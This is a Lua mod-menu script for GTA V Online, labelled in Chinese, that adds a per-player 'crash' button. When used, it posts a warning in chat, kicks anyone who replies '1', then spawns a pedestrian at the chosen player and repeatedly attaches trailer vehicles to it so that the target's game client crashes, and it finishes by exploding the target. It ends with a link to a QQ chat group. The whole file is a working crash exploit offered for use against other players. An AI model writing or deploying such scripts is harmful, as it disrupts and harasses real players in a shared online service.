util.keep_running()
util.require_natives("natives-1663599433")






local function player(pid) 
menu.divider(menu.player_root(pid), "xipro专崩")
    
	

    local crash = menu.list(menu.player_root(pid), "选择你的崩溃方式", {}, "")
    menu.action(crash, "开崩", {"crash_xipro=>"}, "一时兴起，先放这一个", function()
	
	chat.send_message("请注意 将在7秒后崩溃xipro 公屏发送数字 1 可更换战局",false,true,true)
		util.yield(200)
		util.request_model("a_m_y_beach_04", 100)
		util.request_model("boattrailer", 100)
		util.request_model("trailersmall", 100)
		util.request_model("raketrailer", 100)
		
		
	
			chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
				if string.find(text,"1") then
				util.toast("find 1")
				menu.trigger_commands("kick" .. players.get_name(sender))
				end
				
			end)
			util.yield(7000)
			
			local player_ped_location = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                   
					local ped_to_collect = entities.create_ped(0 , util.joaat("a_m_y_beach_04"), player_ped_location, 0)
			for j = 1,5,1 do
			
			
					local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                    
                    ENTITY.SET_ENTITY_VISIBLE(ped_to_collect, true)
                    for i = 1, 3, 1 do
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped_to_collect, player_ped_location.x, player_ped_location.y, player_ped_location.z)
                        for spawn, value in pairs(model_array) do
                            local vels = {}
                            vels[spawn] = entities.create_vehicle(value, player_ped_location, 0)
							
                            for attach, value in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, ped_to_collect, 0, 0, true, true)
                            end
                        end
                        
                    end
					
			
			end
				
                        menu.trigger_commands("explode" ..  players.get_name(pid)) 
						util.yield(1000)
						
util.toast("崩溃完成 关闭脚本")
util.stop_script()	
				
					end)
			
			

	

end
players.on_join(player)
players.dispatch_on_join()
menu.divider(menu.my_root()," ")
menu.divider(menu.my_root(),"崩溃在玩家列表里选择玩家,划到最底下")
menu.divider(menu.my_root()," ")
menu.hyperlink(menu.my_root(), "南瓜的GTA5交流群 点击加入", "https://jq.qq.com/?_wv=1027&k=gl4IRi7a")